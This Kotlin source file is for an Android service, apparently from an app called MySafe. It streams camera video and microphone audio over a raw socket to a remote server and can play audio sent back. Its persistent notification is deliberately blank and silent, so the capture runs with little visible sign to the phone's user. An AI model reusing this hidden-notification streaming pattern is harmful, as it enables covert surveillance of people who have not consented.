package com.mysafe.mysafe

import android.Manifest
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.media.*
import android.os.Build
import android.os.IBinder
import android.util.Log
import android.util.Size
import android.view.Surface
import android.view.WindowManager
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*
import java.io.OutputStream
import java.net.Socket

class CameraStreamService : Service() {
    companion object {
        private const val TAG = "MySafe-Cam"
        private const val CHANNEL_ID = "MySafeCamChannel"
        const val ACTION_START_STREAM = "com.mysafe.mysafe.START_STREAM"
        const val ACTION_STOP_STREAM = "com.mysafe.mysafe.STOP_STREAM"
        const val ACTION_TOGGLE_MIC = "com.mysafe.mysafe.TOGGLE_MIC"
        const val ACTION_TOGGLE_SPEAK = "com.mysafe.mysafe.TOGGLE_SPEAK"
        
        private var cameraDevice: CameraDevice? = null
        private var imageReader: ImageReader? = null
        private var audioRecord: AudioRecord? = null
        private var audioTrack: AudioTrack? = null
        private var isStreaming = false
        private var isMicEnabled = false
        private var isSpeakEnabled = false
        private var serverUrl: String = ""
        private var cameraFacing: Int = CameraCharacteristics.LENS_FACING_BACK
        var surface: Surface? = null
        var statusCallback: ((String) -> Unit)? = null
    }

    private lateinit var cameraManager: CameraManager
    private var socket: Socket? = null
    private var outputStream: OutputStream? = null
    private var audioSendJob: Job? = null
    private var audioRecvJob: Job? = null
    private val scope = CoroutineScope(Dispatchers.IO + Job())

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        startForeground(1, buildNotification())
        cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            ACTION_START_STREAM -> {
                serverUrl = intent.getStringExtra("server_url") ?: ""
                cameraFacing = intent.getIntExtra("camera_facing", CameraCharacteristics.LENS_FACING_BACK)
                startStreaming()
            }
            ACTION_STOP_STREAM -> stopAll()
            ACTION_TOGGLE_MIC -> toggleMic()
            ACTION_TOGGLE_SPEAK -> toggleSpeak()
        }
        return START_STICKY
    }

    private fun updateStatus(text: String) {
        statusCallback?.invoke(text)
        Log.d(TAG, text)
    }

    private fun startStreaming() {
        if (isStreaming) { updateStatus("⚠️ Déjà en streaming"); return }
        updateStatus("⏳ Connexion à $serverUrl...")
        
        if (!connectToServer()) { updateStatus("❌ Connexion échouée"); return }
        if (!openCamera()) { updateStatus("❌ Caméra inaccessible"); return }
        
        isStreaming = true
        if (isMicEnabled) startAudioSend()
        if (isSpeakEnabled) startAudioReceive()
        updateStatus("✅ STREAMING ACTIF")
    }

    private fun connectToServer(): Boolean {
        return try {
            val cleanUrl = serverUrl.replace("http://", "").replace("https://", "")
            val parts = cleanUrl.split(":")
            val host = parts[0]
            val port = if (parts.size > 1) parts[1].toIntOrNull() ?: 8080 else 8080
            socket = Socket(host, port)
            outputStream = socket?.getOutputStream()
            true
        } catch (e: Exception) { Log.e(TAG, "Connexion: ${e.message}"); false }
    }

    private fun openCamera(): Boolean {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) return false
        val cameraId = findCameraId(cameraFacing) ?: return false
        try {
            cameraManager.openCamera(cameraId, cameraStateCallback, null)
            return true
        } catch (e: CameraAccessException) { return false }
    }

    private fun findCameraId(facing: Int): String? {
        for (id in cameraManager.cameraIdList) {
            val chars = cameraManager.getCameraCharacteristics(id)
            if (chars.get(CameraCharacteristics.LENS_FACING) == facing) return id
        }
        return null
    }

    private val cameraStateCallback = object : CameraDevice.StateCallback() {
        override fun onOpened(cam: CameraDevice) {
            cameraDevice = cam
            createCaptureSession()
        }
        override fun onDisconnected(cam: CameraDevice) { cam.close() }
        override fun onError(cam: CameraDevice, error: Int) { cam.close() }
    }

    private fun createCaptureSession() {
        val size = choosePreviewSize() ?: return
        imageReader = ImageReader.newInstance(size.width, size.height, ImageFormat.JPEG, 2)
        
        val surfaces = mutableListOf<Surface>()
        surface?.let { surfaces.add(it) }
        surfaces.add(imageReader!!.surface)
        
        try {
            val req = cameraDevice?.createCaptureRequest(CameraDevice.TEMPLATE_RECORD)?.apply {
                addTarget(imageReader!!.surface)
                surface?.let { addTarget(it) }
            }
            cameraDevice?.createCaptureSession(surfaces, object : CameraCaptureSession.StateCallback() {
                override fun onConfigured(session: CameraCaptureSession) {
                    session.setRepeatingRequest(req?.build()!!, null, null)
                    startVideoTransmission()
                }
                override fun onConfigureFailed(session: CameraCaptureSession) {}
            }, null)
        } catch (e: Exception) {}
    }

    private fun choosePreviewSize(): Size? {
        for (id in cameraManager.cameraIdList) {
            val chars = cameraManager.getCameraCharacteristics(id)
            val map = chars.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
            val sizes = map?.getOutputSizes(ImageFormat.JPEG) ?: continue
            return sizes.firstOrNull {
                val r = it.width.toFloat() / it.height.toFloat()
                Math.abs(r - 4f/3f) < 0.1 || Math.abs(r - 16f/9f) < 0.1
            } ?: sizes.firstOrNull()
        }
        return null
    }

    private fun startVideoTransmission() {
        imageReader?.setOnImageAvailableListener({ reader ->
            try {
                val img = reader.acquireLatestImage() ?: return@setOnImageAvailableListener
                val buf = img.planes[0].buffer
                val bytes = ByteArray(buf.remaining()); buf.get(bytes)
                img.close()
                if (isStreaming && outputStream != null) scope.launch {
                    try {
                        outputStream?.write(bytes.size shr 0)
                        outputStream?.write(bytes.size shr 8)
                        outputStream?.write(bytes)
                    } catch (_: Exception) {}
                }
            } catch (_: Exception) {}
        }, null)
    }

    private fun startAudioSend() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) return
        val sr = 44100
        val minBuf = AudioRecord.getMinBufferSize(sr, AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT)
        audioRecord = AudioRecord(MediaRecorder.AudioSource.VOICE_COMMUNICATION, sr, AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT, minBuf * 4)
        audioRecord?.startRecording()
        audioSendJob = scope.launch {
            val buf = ByteArray(minBuf)
            while (isActive && isMicEnabled && isStreaming) {
                val n = audioRecord?.read(buf, 0, buf.size) ?: 0
                if (n > 0) try { outputStream?.write(1); outputStream?.write(n and 0xFF); outputStream?.write(n shr 8); outputStream?.write(buf, 0, n) } catch (_: Exception) {}
            }
        }
    }

    private fun startAudioReceive() {
        val sr = 44100
        val minBuf = AudioTrack.getMinBufferSize(sr, AudioFormat.CHANNEL_OUT_MONO, AudioFormat.ENCODING_PCM_16BIT)
        audioTrack = AudioTrack.Builder()
            .setAudioAttributes(AudioAttributes.Builder().setUsage(AudioAttributes.USAGE_MEDIA).setContentType(AudioAttributes.CONTENT_TYPE_SPEECH).build())
            .setAudioFormat(AudioFormat.Builder().setSampleRate(sr).setChannelMask(AudioFormat.CHANNEL_OUT_MONO).setEncoding(AudioFormat.ENCODING_PCM_16BIT).build())
            .setBufferSizeInBytes(minBuf * 4).setTransferMode(AudioTrack.MODE_STREAM).build()
        audioTrack?.play()
        audioRecvJob = scope.launch {
            val buf = ByteArray(minBuf)
            while (isActive && isSpeakEnabled && isStreaming && socket?.isConnected == true) {
                try {
                    val input = socket?.getInputStream() ?: break
                    if (input.read() == 2) {
                        val lo = input.read(); val hi = input.read(); val sz = lo or (hi shl 8)
                        if (sz > 0 && sz <= buf.size) { input.read(buf, 0, sz); audioTrack?.write(buf, 0, sz) }
                    }
                } catch (_: Exception) { break }
            }
        }
    }

    private fun toggleMic() {
        isMicEnabled = !isMicEnabled
        if (isMicEnabled && isStreaming) startAudioSend() else { audioSendJob?.cancel(); audioRecord?.stop() }
        updateStatus("🎤 Micro: ${if (isMicEnabled) "ON" else "OFF"}")
    }

    private fun toggleSpeak() {
        isSpeakEnabled = !isSpeakEnabled
        if (isSpeakEnabled && isStreaming) startAudioReceive() else { audioRecvJob?.cancel(); audioTrack?.stop() }
        updateStatus("🔊 Écoute: ${if (isSpeakEnabled) "ON" else "OFF"}")
    }

    private fun stopAll() {
        isStreaming = false; isMicEnabled = false; isSpeakEnabled = false
        audioSendJob?.cancel(); audioRecvJob?.cancel()
        imageReader?.setOnImageAvailableListener(null, null); imageReader?.close()
        cameraDevice?.close()
        audioRecord?.apply { stop(); release() }
        audioTrack?.apply { stop(); release() }
        try { socket?.close() } catch (_: Exception) {}
        updateStatus("⏸️ Streaming arrêté")
        stopSelf()
    }

    private fun buildNotification(): Notification {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            createNotificationChannel()
        }
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setSmallIcon(android.R.drawable.ic_menu_camera)
            .setContentTitle("")
            .setContentText("")
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .setSilent(true)
            .setShowWhen(false)
            .build()
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel(CHANNEL_ID, "CameraStream", NotificationManager.IMPORTANCE_LOW).apply { setShowBadge(false) }
            getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null
    override fun onDestroy() { super.onDestroy(); stopAll(); scope.cancel() }
}
